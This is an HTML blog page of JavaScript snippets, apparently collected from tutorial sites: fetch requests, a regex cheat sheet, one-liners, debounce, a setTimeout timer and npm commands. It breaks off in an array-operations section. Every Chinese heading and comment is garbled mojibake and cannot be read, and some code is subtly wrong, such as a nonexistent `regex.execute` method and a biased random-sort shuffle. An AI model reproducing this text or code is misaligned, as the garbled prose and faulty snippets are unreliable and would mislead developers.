<h3 id="Fetch-ä»£æ›¿-Ajax-çš„æµè§ˆå™¨-API"><a href="#Fetch-ä»£æ›¿-Ajax-çš„æµè§ˆå™¨-API" class="headerlink" title="Fetch ä»£æ›¿ Ajax çš„æµè§ˆå™¨ API"></a>Fetch ä»£æ›¿ Ajax çš„æµè§ˆå™¨ API</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">fetch(url, [&#123;options&#125;])</span><br><span class="line">  .then(<span class="function"><span class="params">response</span> =&gt;</span> response.json())</span><br><span class="line">  .then(<span class="function"><span class="params">data</span> =&gt;</span> <span class="built_in">console</span>.log(data))</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">'https://wp.hellocode.name'</span>)</span><br><span class="line">  .then(<span class="function"><span class="params">response</span> =&gt;</span> response.text())</span><br><span class="line">  .then(<span class="function"><span class="params">data</span> =&gt;</span> <span class="built_in">console</span>.log(data))</span><br><span class="line">fetch(<span class="string">'https://wp.hellocode.name'</span>)</span><br><span class="line">  .then(<span class="function"><span class="params">response</span> =&gt;</span> response.text())</span><br><span class="line">  .then(<span class="function"><span class="params">data</span> =&gt;</span> <span class="built_in">console</span>.log(data))</span><br><span class="line">  .catch(<span class="function"><span class="params">err</span> =&gt;</span> <span class="built_in">console</span>.log(err))</span><br><span class="line">GET è¯·æ±‚</span><br><span class="line"></span><br><span class="line">fetch(<span class="string">'http://httpbin.org/ip'</span>, &#123; </span><br><span class="line">    method: <span class="string">'GET'</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.text()</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">  &#125;)</span><br><span class="line">POST è¯·æ±‚</span><br><span class="line"></span><br><span class="line">fetch(url, &#123; </span><br><span class="line">    method: <span class="string">'POST'</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/json; charset=utf-8'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    body: <span class="built_in">JSON</span>.stringify(&#123; <span class="attr">name</span>: <span class="string">'a'</span>, <span class="attr">password</span>: <span class="string">'b'</span>,&#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.text()</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">  &#125;)</span><br><span class="line">å®Œæ•´ç¤ºä¾‹</span><br><span class="line"></span><br><span class="line">fetch(url, &#123; </span><br><span class="line">    method: <span class="string">'POST'</span>,</span><br><span class="line">    credentials: <span class="string">'include'</span>,</span><br><span class="line">    mode: <span class="string">'cors'</span>,</span><br><span class="line">    cache: <span class="string">'default'</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/json; charset=utf-8'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    body: <span class="built_in">JSON</span>.stringify(&#123; <span class="attr">name</span>: <span class="string">'a'</span>, <span class="attr">password</span>: <span class="string">'b'</span>,&#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.text()</span><br><span class="line">  &#125;)</span><br><span class="line">  .then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res)</span><br><span class="line">  &#125;)</span><br><span class="line">  https:<span class="comment">//learnku.com/articles/34681</span></span><br></pre></td></tr></table></figure>
<h3 id="JavaScript-æ­£åˆ™è¡¨è¾¾å¼"><a href="#JavaScript-æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="JavaScript æ­£åˆ™è¡¨è¾¾å¼"></a>JavaScript æ­£åˆ™è¡¨è¾¾å¼</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> regex;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* åŒ¹é…ç‰¹å®šçš„å­—ç¬¦ä¸² */</span></span><br><span class="line">regex = <span class="regexp">/hello/</span>; <span class="comment">// æŸ¥æ‰¾æ–œæ ä¸­çš„å­—ç¬¦ä¸²ï¼ˆå¤§å°å†™æ•æ„Ÿï¼‰â€¦â€¦åŒ¹é… "hello", "hello123", "123hello123", "123hello"ï¼Œä½†ä¸åŒ¹é… "hell0", "Hello"</span></span><br><span class="line">regex = <span class="regexp">/hello/i</span>; <span class="comment">// æŸ¥æ‰¾æ–œæ ä¸­çš„å­—ç¬¦ä¸²ï¼ˆå¤§å°å†™ä¸æ•æ„Ÿï¼‰â€¦â€¦åŒ¹é… "hello", "HelLo", "123HelLO"</span></span><br><span class="line">regex = <span class="regexp">/hello/g</span>; <span class="comment">// å…¨å±€æŸ¥æ‰¾æ–œæ ä¸­çš„å­—ç¬¦ä¸²â€¦â€¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* é€šé…ç¬¦ */</span></span><br><span class="line">regex = <span class="regexp">/h.llo/</span>; <span class="comment">// "." åŒ¹é…é™¤äº†æ¢è¡Œå¤–çš„ä»»ä½•ä¸€ä¸ªå­—ç¬¦â€¦â€¦åŒ¹é… "hello", "hallo"ï¼Œä½†ä¸åŒ¹é… "h\nllo"</span></span><br><span class="line">regex = <span class="regexp">/h.*llo/</span>; <span class="comment">// "*" åŒ¹é…ä»»ä½•å­—ç¬¦é›¶æ¬¡æˆ–å¤šæ¬¡ï¼Œå¦‚ "hello", "heeeeeello", "hllo", "hwarwareallo"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ç®€ç•¥å­—ç¬¦ç±» */</span></span><br><span class="line">regex = <span class="regexp">/\d/</span>; <span class="comment">// åŒ¹é…æ•°å­—</span></span><br><span class="line">regex = <span class="regexp">/\D/</span>; <span class="comment">// åŒ¹é…éæ•°å­—</span></span><br><span class="line">regex = <span class="regexp">/\w/</span>; <span class="comment">// åŒ¹é…å•è¯å­—ç¬¦ (a-z, A-Z, 0-9, _)</span></span><br><span class="line">regex = <span class="regexp">/\W/</span>; <span class="comment">// åŒ¹é…éå•è¯å­—ç¬¦</span></span><br><span class="line">regex = <span class="regexp">/\s/</span>; <span class="comment">// åŒ¹é…ç©ºç™½å­—ç¬¦ï¼ˆ\r (å›è½¦),\n (æ¢è¡Œ), \t (åˆ¶è¡¨ç¬¦), \f (æ¢é¡µç¬¦)ï¼‰</span></span><br><span class="line">regex = <span class="regexp">/\S/</span>; <span class="comment">// åŒ¹é…éç©ºç™½å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ç‰¹å®šå­—ç¬¦ */</span></span><br><span class="line">regex = <span class="regexp">/[aeiou]/</span>; <span class="comment">// åŒ¹é…æ–¹æ‹¬å·ä¸­çš„ä»»æ„å­—ç¬¦</span></span><br><span class="line">regex = <span class="regexp">/[ck]atherine/</span>; <span class="comment">// åŒ¹é… catherine æˆ– katherine</span></span><br><span class="line">regex = <span class="regexp">/[^aeiou]/</span>; <span class="comment">// åŒ¹é…é™¤æ–¹æ‹¬å·å†…ä»¥å¤–çš„å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* å­—ç¬¦èŒƒå›´ */</span></span><br><span class="line">regex = <span class="regexp">/[a-z]/</span>; <span class="comment">// åŒ¹é…å°å†™å­—æ¯</span></span><br><span class="line">regex = <span class="regexp">/[A-Z]/</span>; <span class="comment">// åŒ¹é…å¤§å†™å­—æ¯</span></span><br><span class="line">regex = <span class="regexp">/[e-l]/</span>; <span class="comment">// åŒ¹é…ä» e åˆ° l çš„å­—æ¯</span></span><br><span class="line">regex = <span class="regexp">/[F-P]/</span>; <span class="comment">// åŒ¹é… F åˆ° P çš„å­—æ¯</span></span><br><span class="line">regex = <span class="regexp">/[0-9]/</span>; <span class="comment">// åŒ¹é…æ•°å­—</span></span><br><span class="line">regex = <span class="regexp">/[5-9]/</span>; <span class="comment">// åŒ¹é… 5 è‡³ 9 çš„æ•°å­—</span></span><br><span class="line">regex = <span class="regexp">/[a-zA-Z]/</span>; <span class="comment">// åŒ¹é…å¤§å°å†™å­—æ¯</span></span><br><span class="line">regex = <span class="regexp">/[^a-zA-Z]/</span>; <span class="comment">// åŒ¹é…éå­—æ¯</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½¿ç”¨é‡è¯é‡å¤åŒ¹é… */</span></span><br><span class="line">regex = <span class="regexp">/(hello)&#123;4&#125;/</span>; <span class="comment">// åŒ¹é… "hellohellohellohello"</span></span><br><span class="line">regex = <span class="regexp">/hello&#123;3&#125;/</span>; <span class="comment">// åŒ¹é… "hellooo" å’Œ "helloooo"ï¼Œä½†ä¸åŒ¹é… "helloo"</span></span><br><span class="line">regex = <span class="regexp">/\d&#123;3&#125;/</span>; <span class="comment">// åŒ¹é…ä¸‰ä¸ªæ•°å­— (åŒ¹é… "312", "122", "111", "12312321"ï¼Œä½†ä¸åŒ¹é… "12")</span></span><br><span class="line">regex = <span class="regexp">/\d&#123;3,7&#125;/</span>; <span class="comment">// åŒ¹é…ä¸‰åˆ°ä¸ƒä¸ªæ•°å­—</span></span><br><span class="line">regex = <span class="regexp">/\d&#123;3,&#125;/</span>; <span class="comment">// åŒ¹é…è‡³å°‘ä¸‰ä¸ªæ•°å­—</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ä½¿ç”¨æ˜Ÿå·å’ŒåŠ å·åŒ¹é…é‡å¤ */</span></span><br><span class="line">regex = <span class="regexp">/ab*c/</span>; <span class="comment">// åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªé‡å¤çš„ "b"ï¼ˆåŒ¹é… "abc", "abbbbc", "ac"ï¼‰</span></span><br><span class="line">regex = <span class="regexp">/ab+c/</span>; <span class="comment">// åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªé‡å¤çš„ "b"ï¼ˆåŒ¹é… "abc", "abbbbc", ä½†ä¸åŒ¹é… "ac"ï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* åŒ¹é…å¼€å¤´æˆ–ç»“å°¾çš„é¡¹ç›® */</span></span><br><span class="line">regex = <span class="regexp">/^[A-Z]\w*/</span>; <span class="comment">// åŒ¹é… "H", "Hello", ä½†ä¸åŒ¹é… "hey"</span></span><br><span class="line">regex = <span class="regexp">/\w*s$/</span>; <span class="comment">// åŒ¹é… "cats", "dogs", "avocados", ä½†ä¸åŒ¹é… "javascript"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* åŒ¹é…å•è¯åˆ†ç•Œ</span></span><br><span class="line"><span class="comment">   å•è¯åˆ†ç•Œä½ç½®</span></span><br><span class="line"><span class="comment">   1. é¦–å­—ç¬¦æ˜¯å•è¯å­—ç¬¦çš„å­—ç¬¦ä¸²ä¹‹å‰</span></span><br><span class="line"><span class="comment">   2. æœ«å­—ç¬¦æ˜¯å•è¯å­—ç¬¦çš„å­—ç¬¦ä¸²ä¹‹å</span></span><br><span class="line"><span class="comment">   3. ä¸¤ä¸ªå­—ç¬¦é—´ï¼Œå…¶ä¸­ä¸€ä¸ªå±äºå•è¯å­—ç¬¦è€Œå¦ä¸€ä¸ªä¸æ˜¯ */</span></span><br><span class="line">regex = <span class="regexp">/\bmeow\b/</span>; <span class="comment">// åŒ¹é… "hey meow lol", "hey:meow:lol", ä½†ä¸åŒ¹é… "heymeow lol"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* åˆ†ç»„ */</span></span><br><span class="line">regex = <span class="regexp">/it is (ice )?cold outside/</span>; <span class="comment">// åŒ¹é… "it is ice cold outside" å’Œ "it is cold outside"</span></span><br><span class="line">regex = <span class="regexp">/it is (?:ice )?cold outside/</span>; <span class="comment">// è·Ÿä¸Šé¢ä¸€æ ·ï¼Œä½†è¿™æ˜¯ä¸€ä¸ªéæ•è·åˆ†ç»„</span></span><br><span class="line">regex = <span class="regexp">/do (cats) like taco \1/</span>; <span class="comment">// åŒ¹é… "do cats like taco cats"</span></span><br><span class="line">regex = <span class="regexp">/do (cats) like (taco)\? do \2 \1 like you\?/</span>; <span class="comment">// åŒ¹é… "do cats like taco? do taco cats like you?"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ†æ”¯é‡ç½®åˆ†ç»„ï¼ˆPerl, PHP, R, Delphi ç­‰è¯­è¨€æ”¯æŒæ­¤åŠŸèƒ½ï¼ŒJS ä¸æ”¯æŒï¼Œå› æ­¤æ³¨é‡Šæ‰ï¼‰</span></span><br><span class="line"><span class="comment">// regex = /(?|(cat)|(dog))\1/; // åŒ¹é… "catcat" å’Œ "dogdog"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* å¤šé€‰åŒ¹é… */</span></span><br><span class="line">regex = <span class="regexp">/i like (tacos|boba|guacamole)\./</span>; <span class="comment">// åŒ¹é… "i like tacos.", "i like boba.", and "i like guacamole."</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* å‘å‰å¼•ç”¨ï¼ˆPerl, PHP, R, Delphi ç­‰è¯­è¨€æ”¯æŒæ­¤åŠŸèƒ½ï¼ŒJS ä¸æ”¯æŒï¼Œå› æ­¤æ³¨é‡Šæ‰ï¼‰*/</span></span><br><span class="line"><span class="comment">// regex = /(\2train|(choo))+/; // åŒ¹é… "choo", "choochoo", "chootrain", choochootrain", ä½†ä¸åŒ¹é… "train"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* é¡ºåºç¯è§† */</span></span><br><span class="line">regex = <span class="regexp">/z(?=a)/</span>; <span class="comment">// è‚¯å®šå‹é¡ºåºç¯è§†â€¦â€¦åŒ¹é…åœ¨ "a" ä¹‹å‰çš„ "z" (æ¯”å¦‚ pizza)ï¼Œä½†ä¸åŒ¹é…é¦–å­—ç¬¦ "z"</span></span><br><span class="line">regex = <span class="regexp">/z(?!a)/</span>; <span class="comment">// å¦å®šå‹é¡ºåºç¯è§†â€¦â€¦åŒ¹é…é¦–å­—ç¬¦ "z"ï¼Œé™¤äº†åœ¨ "a" ä¹‹å‰çš„ "z"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* é€†åºç¯è§† */</span></span><br><span class="line">regex = <span class="regexp">/(?&lt;=[aeiou])\w/</span>; <span class="comment">// è‚¯å®šå‹é€†åºç¯è§†â€¦â€¦åŒ¹é…åœ¨å…ƒéŸ³åçš„å•è¯å­—ç¬¦</span></span><br><span class="line">regex = <span class="regexp">/(?&lt;![aeiou])\w/</span>; <span class="comment">// å¦å®šå‹é€†åºç¯è§†â€¦â€¦åŒ¹é…ä¸åœ¨åŸå› åçš„å•è¯å­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* æˆ‘è§‰å¾—å¾ˆæœ‰ç”¨çš„å‡½æ•° */</span></span><br><span class="line">regex.test(<span class="string">"hello"</span>); <span class="comment">// å¦‚æœæœ‰åŒ¹é…åˆ™è¿”å›çœŸ</span></span><br><span class="line">regex.execute(<span class="string">"hello"</span>); <span class="comment">// æœ‰åŒ¹é…è¿”å›æ•°ç»„ï¼Œåä¹‹ä¸º null</span></span><br><span class="line"><span class="string">"football"</span>.replace(<span class="regexp">/foot/</span>, <span class="string">"basket"</span>); <span class="comment">// ç”¨ç¬¬äºŒä¸ªå‚æ•°å–ä»£åŒ¹é…</span></span><br><span class="line">https:<span class="comment">//learnku.com/f2e/t/38217</span></span><br></pre></td></tr></table></figure>
<h3 id="åˆ†äº«åä¸ªçè—çš„å•è¡Œ-JS-ä»£ç "><a href="#åˆ†äº«åä¸ªçè—çš„å•è¡Œ-JS-ä»£ç " class="headerlink" title="åˆ†äº«åä¸ªçè—çš„å•è¡Œ JS ä»£ç "></a>åˆ†äº«åä¸ªçè—çš„å•è¡Œ JS ä»£ç </h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">æ‰“å°é”®ç›˜ </span><br><span class="line">(<span class="function"><span class="params">_</span>=&gt;</span>[...<span class="string">"`1234567890-=~~QWERTYUIOP[].~ASDFGHJKL;'~~ZXCVBNM,./~"</span>].map(<span class="function"><span class="params">x</span>=&gt;</span>(o+=<span class="string">`/<span class="subst">$&#123;b=<span class="string">'_'</span>.repeat(w=x&lt;y?<span class="number">2</span>:<span class="string">' 667699'</span>[x=[<span class="string">"BS"</span>,<span class="string">"TAB"</span>,<span class="string">"CAPS"</span>,<span class="string">"ENTER"</span>][p++]||<span class="string">'SHIFT'</span>,p])&#125;</span>.|`</span>,m+=y+(x+<span class="string">'    '</span>).slice(<span class="number">0</span>,w)+y+y,n+=y+b+y+y,l+=<span class="string">' __'</span>+b)[<span class="number">73</span>]&amp;&amp;(k.push(l,m,n,o),l=<span class="string">''</span>,m=n=o=y),m=n=o=y=<span class="string">'|'</span>,p=l=k=[])&amp;&amp;k.join<span class="string">`</span></span><br><span class="line"><span class="string">`</span>)()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;++i&lt;<span class="number">101</span>;<span class="built_in">console</span>.log(i%<span class="number">5</span>?f||i:f+<span class="string">'Buzz'</span>))f=i%<span class="number">3</span>?<span class="string">''</span>:<span class="string">'Fizz'</span></span><br><span class="line"> <span class="number">16</span>è¿›åˆ¶</span><br><span class="line"> <span class="string">'#'</span> + <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">0xffffff</span>).toString(<span class="number">16</span>).padEnd(<span class="number">6</span>, <span class="string">'0'</span>);</span><br><span class="line">ä¹±åº</span><br><span class="line">(arr) =&gt; arr.slice().sort(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">Math</span>.random() - <span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">&lt;body onload=<span class="string">"setInterval(()=&gt;document.body.innerHTML=new Date().toGMTString().slice(17,25))"</span>&gt;&lt;/body&gt;</span><br><span class="line"> ?foo=bar&amp;baz=<span class="function"><span class="params">bing</span> =&gt;</span> &#123;<span class="attr">foo</span>: bar, <span class="attr">baz</span>: bing&#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// Set the current page's query parameters to `q`</span></span><br><span class="line"> q=&#123;&#125;;location.search.replace(<span class="regexp">/([^?&amp;=]+)=([^&amp;]*)/g</span>,(_,k,v)=&gt;q[k]=v);q;</span><br><span class="line"><span class="built_in">Math</span>.random().toString(<span class="number">36</span>).substring(<span class="number">2</span>);</span><br><span class="line">æœ€è¿‘<span class="number">7</span>å¤©</span><br><span class="line">[...Array(<span class="number">7</span>).keys()].map(<span class="function"><span class="params">days</span> =&gt;</span> <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="built_in">Date</span>.now() - <span class="number">86400000</span> * days));</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/f2e/t/38309</span></span><br></pre></td></tr></table></figure>
<h3 id="JavaScript-ä¸­çš„é˜²æŠ–ä¸èŠ‚æµ"><a href="#JavaScript-ä¸­çš„é˜²æŠ–ä¸èŠ‚æµ" class="headerlink" title="JavaScript ä¸­çš„é˜²æŠ–ä¸èŠ‚æµ"></a>JavaScript ä¸­çš„é˜²æŠ–ä¸èŠ‚æµ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">å½“ç”¨æˆ·è§¦å‘æŸæ¬¡äº‹ä»¶åï¼Œè‹¥åœ¨è§„å®šæ—¶é—´å†…ä¸å†è§¦å‘è¯¥äº‹ä»¶ï¼Œåˆ™è¿™ä¸ªäº‹ä»¶æ‰ä¼šè¢«çœŸæ­£å“åº”ã€‚æˆ‘ä»¬ç§°è¿™æ ·çš„æœºåˆ¶ä¸ºé˜²æŠ–</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @desc å‡½æ•°é˜²æŠ–</span></span><br><span class="line"><span class="comment"> * @param func å‡½æ•°https://learnku.com/articles/38190</span></span><br><span class="line"><span class="comment"> * @param wait å»¶è¿Ÿæ‰§è¡Œæ¯«ç§’æ•°</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> timeout;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> context = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">let</span> args = <span class="built_in">arguments</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (timeout) clearTimeout(timeout)</span><br><span class="line">        timeout = setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            func.apply(context, args)</span><br><span class="line">        &#125;, wait);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="setTimeoutå†™æ³•æ›¿ä»£setInterval"><a href="#setTimeoutå†™æ³•æ›¿ä»£setInterval" class="headerlink" title="setTimeoutå†™æ³•æ›¿ä»£setInterval"></a>setTimeoutå†™æ³•æ›¿ä»£setInterval</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">setIntervalå®ç°</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¯åˆ†é’ŸæŸ¥è¯¢ä¸€æ¬¡</span></span><br><span class="line"><span class="keyword">var</span> timer = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        getMessageNum(); <span class="comment">//å¼‚æ­¥è·å–åå°æ•°æ®</span></span><br><span class="line">    &#125;, <span class="number">60000</span>);</span><br><span class="line">&#125;;</span><br><span class="line">setTimeoutæ–¹æ³•æ›¿æ¢</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> timer = <span class="function"><span class="keyword">function</span> (<span class="params">fn, time</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">walk</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            fn();</span><br><span class="line">            walk();</span><br><span class="line">        &#125;, time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">https:<span class="comment">//www.shanyuliang.com/archives/297</span></span><br><span class="line">timer(getMessageNum, <span class="number">60000</span>)();</span><br></pre></td></tr></table></figure>
<p>###<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å®‰è£…åŒ… npm i package  npm i -g package </span><br><span class="line">æµ‹è¯•npm t </span><br><span class="line">æ–°é¡¹ç›®ï¼Œæ— éœ€æ‰“å¼€ package.json åªéœ€è¦è¿è¡Œ npm run å³å¯è·å–å¯ç”¨å‘½ä»¤åˆ—è¡¨</span><br><span class="line">è¿è¡Œ npm ls - - depth <span class="number">0</span> å³å¯ç½—åˆ—æ‰€æœ‰å·²å®‰è£…çš„åŒ…ä¿¡æ¯</span><br><span class="line">npm home your_packageï¼Œè¿™ä¸ªå‘½ä»¤å°† ç›´æ¥å¸¦åˆ°ä¸»é¡µæ–‡æ¡£</span><br><span class="line">npm repo your-package å°†ç›´æ¥å¸¦ä½ è¿›å…¥åŒ…å®˜æ–¹ GitHub åœ°å€https:<span class="comment">//learnku.com/f2e/t/39046</span></span><br></pre></td></tr></table></figure></p>
<h3 id="JavaScript-æ•°ç»„æ“ä½œ"><a href="#JavaScript-æ•°ç»„æ“ä½œ" class="headerlink" title="JavaScript æ•°ç»„æ“ä½œ"></a>JavaScript æ•°ç»„æ“ä½œ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 